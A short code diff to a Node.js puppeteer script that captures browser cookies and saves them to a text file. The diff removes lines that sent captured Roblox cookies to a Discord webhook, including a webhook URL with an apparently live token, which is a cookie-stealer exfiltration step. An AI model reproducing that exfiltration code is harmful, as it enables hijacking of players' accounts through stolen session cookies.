@@ -1,8 +1,5 @@
-const axios = require('axios');
 const puppeteer = require('puppeteer');
 const fs = require('fs');
-
-const webhookUrl = 'https://discordapp.com/api/webhooks/1508814909008515094/K6_XrOoEL_GXG1UJ2Rf9KI_1b76AgKZ7lAM_Nt-WSZkW8mjKxzCCFxavsTiG4ylQyPGL'; // Replace with your Discord webhook URL
 
 async function captureCookies() {
     const browser = await puppeteer.launch({ headless: false });
@@ -19,11 +16,6 @@ async function captureCookies() {
 
     // Save cookies to a notepad file
     fs.writeFileSync('cookies.txt', JSON.stringify(cookies, null, 2));
-
-    // Send the cookies to Discord
-    await axios.post(webhookUrl, {
-        content: `**Roblox Cookies:**\n\`\`\`${JSON.stringify(cookies, null, 2)}\`\`\``,
-    });
 
     // Close the browser
     await browser.close();
